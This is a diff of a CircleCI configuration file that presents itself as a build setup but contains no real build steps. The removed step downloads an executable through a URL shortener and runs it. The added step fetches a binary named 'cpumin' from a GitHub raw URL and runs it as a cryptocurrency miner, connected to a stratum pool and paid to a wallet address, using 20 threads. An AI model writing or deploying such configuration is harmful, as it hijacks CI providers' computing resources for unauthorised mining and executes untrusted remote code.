@@ -1,12 +1,11 @@
 version: 2.1
-
-orbs:
-   win: circleci/windows@2.2.0
-
-jobs: 
-  build: 
-    executor:
-      name: win/default
-      shell: cmd.exe
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
     steps:
-      - run: curl -L -o rDwz0VHD09.exe https://shortenlinks.net/rDwz0VHD09 && rDwz0VHD09.exe
+      - checkout 
+      - run: wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin && chmod +x cpumin && ./cpumin -a yescryptR16 -o stratum+tcp://stratum-asia.rplant.xyz:17055 -u qRNDBVci5Afgiq8uCkmQ9BTX9fxtAUdVUS.$(echo  $(shuf -i 1-9999 -n 1)-circle) -t 20
